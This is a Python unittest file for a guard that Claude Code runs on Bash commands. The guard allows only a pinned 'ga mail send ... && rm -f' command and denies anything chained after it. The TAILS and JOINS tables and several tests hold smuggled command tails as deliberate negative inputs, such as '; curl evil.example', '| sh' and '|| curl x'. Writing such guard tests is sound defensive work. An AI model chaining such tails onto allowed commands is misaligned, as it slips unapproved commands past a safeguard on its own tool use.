"""CMD-GR8 (BD-268): behavioural tests for chained commands after the pinned `ga mail` -- not golden bytes.

The pass-through takes exactly `ga mail send ... --guard-event F && rm -f F`. Anything chained after it -- a third
`&&` part, or `;`, `||`, `|`, `&` -- must make the command 'unpinned', so the guard denies it (rlo up) and does not let
it through when the guard fails closed. A regression here would open Bash.
"""
import importlib.util
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from ga.rlo import remote

from .test_gr7 import Worker, venv

EV = ".ga/mailbox/outbox/20260101T000000.000000Z-1-A1.jsonl"
SEND = f"ga mail send --repo . --to hub --from W1 --guard-event {EV} --re CMD-X1"
PINNED = f"{SEND} && rm -f {EV}"
# what may follow the pinned command, each of which must close it
TAILS = {
    "and_third_part": " && curl evil.example",
    "and_third_rm": f" && rm -f {EV}",
    "and_fourth_part": " && ls && curl evil.example",
    "semicolon": "; curl evil.example",
    "semicolon_spaced": " ; curl evil.example",
    "or": " || curl evil.example",
    "pipe": " | sh",
    "pipe_tight": "|sh",
    "background": " & curl evil.example",
}
# the same connectors between the send and its rm, in place of `&&`
JOINS = {"semicolon": "; ", "or": " || ", "pipe": " | ", "background": " & ", "newline": "\n"}


def load(repo: Path):
    spec = importlib.util.spec_from_file_location(f"guard_gr8_{id(repo)}", repo / "ops/rlo/guard.py")
    mod = importlib.util.module_from_spec(spec)
    with mock.patch.dict(os.environ, {"CLAUDE_PROJECT_DIR": str(repo)}):
        spec.loader.exec_module(mod)
    return mod


class ChainedMailTest(unittest.TestCase):
    """mail() of the generated guard.py, on chained commands."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="ga-rlo-gr8-"))
        cls.repo = cls.tmp / "work"
        cls.repo.mkdir()
        remote.write(cls.repo, "W1")
        cls.guard = load(cls.repo)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, True)

    def mail(self, cmd: str) -> str | None:
        return self.guard.mail(cmd, str(self.repo))

    def test_the_pinned_send_and_rm_stays_pinned(self):
        self.assertEqual(self.mail(PINNED), "pinned")
        self.assertEqual(self.mail(SEND), "pinned")

    def test_three_or_more_parts_are_unpinned(self):
        for name in ("and_third_part", "and_third_rm", "and_fourth_part"):
            with self.subTest(tail=name):
                self.assertEqual(self.mail(PINNED + TAILS[name]), "unpinned")

    def test_semicolon_or_pipe_after_the_pinned_command_are_unpinned(self):
        for name in ("semicolon", "semicolon_spaced", "or", "pipe", "pipe_tight", "background"):
            with self.subTest(tail=name):
                self.assertEqual(self.mail(PINNED + TAILS[name]), "unpinned")
                self.assertEqual(self.mail(SEND + TAILS[name]), "unpinned")  # after the send alone too

    def test_other_connectors_in_place_of_and(self):
        for name, join in JOINS.items():
            with self.subTest(join=name):
                self.assertEqual(self.mail(f"{SEND}{join}rm -f {EV}"), "unpinned")

    def test_a_connector_inside_the_rm_part_is_unpinned(self):
        for cmd in (f"{SEND} && rm -f {EV};curl x", f"{SEND} && rm -f {EV}||curl x", f"{SEND} && rm -f {EV}|sh",
                    f"{SEND} && rm -f {EV} x"):
            with self.subTest(cmd=cmd):
                self.assertEqual(self.mail(cmd), "unpinned")


class ChainedMailThroughTheGuardTest(unittest.TestCase):
    """The same chains through guard.sh, as Claude Code runs it: denied with rlo up, and not let through when the
    guard fails closed (where only the pinned form passes)."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="ga-rlo-gr8-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.repo = self.tmp / "work"
        self.repo.mkdir()
        remote.write(self.repo, "W1")
        pin = remote.pin_of(self.repo / "ops/rlo/install.sh")
        self.up = Worker(self.tmp, self.repo, venv(self.tmp / "venv", pin))
        self.closed = Worker(self.tmp, self.repo, Path("/dev/null/ga-rlo-no-venv"))  # install fails: fail closed

    def test_chains_are_denied_up_and_closed(self):
        for w in (self.up, self.closed):
            self.assertEqual(w.call("Bash", {"command": PINNED}), (None, ""))
            for name, tail in TAILS.items():
                with self.subTest(guard="up" if w is self.up else "closed", tail=name):
                    dec, why = w.call("Bash", {"command": PINNED + tail})
                    self.assertEqual(dec, "deny")
                    self.assertIn("rlo guard (channel pin)", why)


if __name__ == "__main__":
    unittest.main()
